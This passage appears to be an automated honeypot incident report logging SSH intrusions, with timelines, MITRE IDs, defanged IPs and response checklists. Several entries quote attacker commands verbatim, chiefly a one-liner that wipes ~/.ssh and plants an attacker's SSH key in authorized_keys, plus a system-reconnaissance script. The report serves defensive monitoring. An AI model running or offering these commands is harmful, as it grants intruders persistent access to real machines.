| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:09` | `cowrie.session.connect` |
| `2026-08-19 12:27:09` | `cowrie.client.version` |
| `2026-08-19 12:27:09` | `cowrie.client.kex` |
| `2026-08-19 12:27:10` | `cowrie.login.success` |
| `2026-08-19 12:27:10` | `cowrie.session.params` |
| `2026-08-19 12:27:10` | `cowrie.command.input` |
| `2026-08-19 12:27:10` | `cowrie.command.failed` |
| `2026-08-19 12:27:11` | `cowrie.log.closed` |
| `2026-08-19 12:27:11` | `cowrie.session.params` |
| `2026-08-19 12:27:11` | `cowrie.command.input` |
| `2026-08-19 12:27:11` | `cowrie.session.file_download` |
| `2026-08-19 12:27:11` | `cowrie.log.closed` |
| `2026-08-19 12:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6bf4f855d8b

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:12` | `cowrie.session.connect` |
| `2026-08-19 12:27:12` | `cowrie.client.version` |
| `2026-08-19 12:27:12` | `cowrie.client.kex` |
| `2026-08-19 12:27:12` | `cowrie.login.success` |
| `2026-08-19 12:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8bbe146fa0

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:12` | `cowrie.session.connect` |
| `2026-08-19 12:27:12` | `cowrie.client.version` |
| `2026-08-19 12:27:12` | `cowrie.client.kex` |
| `2026-08-19 12:27:13` | `cowrie.login.success` |
| `2026-08-19 12:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14652c3d19db

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:32` | `cowrie.session.connect` |
| `2026-08-19 12:27:32` | `cowrie.client.version` |
| `2026-08-19 12:27:32` | `cowrie.client.kex` |
| `2026-08-19 12:27:33` | `cowrie.login.success` |
| `2026-08-19 12:27:34` | `cowrie.session.params` |
| `2026-08-19 12:27:34` | `cowrie.command.input` |
| `2026-08-19 12:27:34` | `cowrie.command.failed` |
| `2026-08-19 12:27:35` | `cowrie.log.closed` |
| `2026-08-19 12:27:36` | `cowrie.session.params` |
| `2026-08-19 12:27:36` | `cowrie.command.input` |
| `2026-08-19 12:27:36` | `cowrie.session.file_download` |
| `2026-08-19 12:27:36` | `cowrie.log.closed` |
| `2026-08-19 12:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7117999a5d02

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:36` | `cowrie.session.connect` |
| `2026-08-19 12:27:36` | `cowrie.client.version` |
| `2026-08-19 12:27:37` | `cowrie.client.kex` |
| `2026-08-19 12:27:38` | `cowrie.login.success` |
| `2026-08-19 12:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70420cda15c3

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]0` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:27:38` | `cowrie.session.connect` |
| `2026-08-19 12:27:38` | `cowrie.client.version` |
| `2026-08-19 12:27:39` | `cowrie.client.kex` |
| `2026-08-19 12:27:40` | `cowrie.login.success` |
| `2026-08-19 12:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d40399cdb655

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 12:28 |
| **Last Seen** | 2026-08-19 12:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:28:47` | `cowrie.session.connect` |
| `2026-08-19 12:28:48` | `cowrie.client.version` |
| `2026-08-19 12:28:48` | `cowrie.client.kex` |
| `2026-08-19 12:28:55` | `cowrie.login.success` |
| `2026-08-19 12:28:59` | `cowrie.session.params` |
| `2026-08-19 12:28:59` | `cowrie.command.input` |
| `2026-08-19 12:29:01` | `cowrie.log.closed` |
| `2026-08-19 12:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93cffb176ae7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:29 |
| **Last Seen** | 2026-08-19 12:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:29:14` | `cowrie.session.connect` |
| `2026-08-19 12:29:14` | `cowrie.client.version` |
| `2026-08-19 12:29:14` | `cowrie.client.kex` |
| `2026-08-19 12:29:15` | `cowrie.login.success` |
| `2026-08-19 12:29:16` | `cowrie.session.params` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.success` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.command.input` |
| `2026-08-19 12:29:16` | `cowrie.log.closed` |
| `2026-08-19 12:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bedaf24023a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:30 |
| **Last Seen** | 2026-08-19 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:30:04` | `cowrie.session.connect` |
| `2026-08-19 12:30:04` | `cowrie.client.version` |
| `2026-08-19 12:30:05` | `cowrie.client.kex` |
| `2026-08-19 12:30:05` | `cowrie.login.success` |
| `2026-08-19 12:30:06` | `cowrie.session.params` |
| `2026-08-19 12:30:06` | `cowrie.command.input` |
| `2026-08-19 12:30:06` | `cowrie.log.closed` |
| `2026-08-19 12:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66ef86d5b15

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:31 |
| **Last Seen** | 2026-08-19 12:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:31:19` | `cowrie.session.connect` |
| `2026-08-19 12:31:20` | `cowrie.client.version` |
| `2026-08-19 12:31:20` | `cowrie.client.kex` |
| `2026-08-19 12:31:22` | `cowrie.login.success` |
| `2026-08-19 12:31:23` | `cowrie.session.params` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.success` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.command.input` |
| `2026-08-19 12:31:23` | `cowrie.log.closed` |
| `2026-08-19 12:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd7f02df1f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:33 |
| **Last Seen** | 2026-08-19 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:33:24` | `cowrie.session.connect` |
| `2026-08-19 12:33:24` | `cowrie.client.version` |
| `2026-08-19 12:33:24` | `cowrie.client.kex` |
| `2026-08-19 12:33:25` | `cowrie.login.success` |
| `2026-08-19 12:33:27` | `cowrie.session.params` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.success` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.command.input` |
| `2026-08-19 12:33:27` | `cowrie.log.closed` |
| `2026-08-19 12:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e2d84471d8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:35 |
| **Last Seen** | 2026-08-19 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:35:28` | `cowrie.session.connect` |
| `2026-08-19 12:35:29` | `cowrie.client.version` |
| `2026-08-19 12:35:29` | `cowrie.client.kex` |
| `2026-08-19 12:35:30` | `cowrie.login.success` |
| `2026-08-19 12:35:31` | `cowrie.session.params` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.success` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:31` | `cowrie.command.input` |
| `2026-08-19 12:35:32` | `cowrie.log.closed` |
| `2026-08-19 12:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e34e4241cf

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:36 |
| **Last Seen** | 2026-08-19 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:36:01` | `cowrie.session.connect` |
| `2026-08-19 12:36:01` | `cowrie.client.version` |
| `2026-08-19 12:36:01` | `cowrie.client.kex` |
| `2026-08-19 12:36:01` | `cowrie.login.success` |
| `2026-08-19 12:36:02` | `cowrie.session.params` |
| `2026-08-19 12:36:02` | `cowrie.command.input` |
| `2026-08-19 12:36:02` | `cowrie.log.closed` |
| `2026-08-19 12:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff7dabaaf51

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-19 12:36 |
| **Last Seen** | 2026-08-19 12:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:36:15` | `cowrie.session.connect` |
| `2026-08-19 12:36:16` | `cowrie.client.version` |
| `2026-08-19 12:36:16` | `cowrie.client.kex` |
| `2026-08-19 12:36:18` | `cowrie.login.success` |
| `2026-08-19 12:36:18` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b02219d6d0

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-19 12:36 |
| **Last Seen** | 2026-08-19 12:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:36:24` | `cowrie.session.connect` |
| `2026-08-19 12:36:25` | `cowrie.client.version` |
| `2026-08-19 12:36:25` | `cowrie.client.kex` |
| `2026-08-19 12:36:27` | `cowrie.login.success` |
| `2026-08-19 12:36:28` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69baf1f7b283

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:37 |
| **Last Seen** | 2026-08-19 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:37:35` | `cowrie.session.connect` |
| `2026-08-19 12:37:35` | `cowrie.client.version` |
| `2026-08-19 12:37:35` | `cowrie.client.kex` |
| `2026-08-19 12:37:37` | `cowrie.login.success` |
| `2026-08-19 12:37:39` | `cowrie.session.params` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.success` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.command.input` |
| `2026-08-19 12:37:39` | `cowrie.log.closed` |
| `2026-08-19 12:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f65d39bc55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:39 |
| **Last Seen** | 2026-08-19 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:39:47` | `cowrie.session.connect` |
| `2026-08-19 12:39:47` | `cowrie.client.version` |
| `2026-08-19 12:39:47` | `cowrie.client.kex` |
| `2026-08-19 12:39:49` | `cowrie.login.success` |
| `2026-08-19 12:39:50` | `cowrie.session.params` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.success` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:50` | `cowrie.command.input` |
| `2026-08-19 12:39:51` | `cowrie.log.closed` |
| `2026-08-19 12:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016632c12c33

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 12:41 |
| **Last Seen** | 2026-08-19 12:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:41:17` | `cowrie.session.connect` |
| `2026-08-19 12:41:18` | `cowrie.client.version` |
| `2026-08-19 12:41:18` | `cowrie.client.kex` |
| `2026-08-19 12:41:25` | `cowrie.login.success` |
| `2026-08-19 12:41:28` | `cowrie.session.params` |
| `2026-08-19 12:41:28` | `cowrie.command.input` |
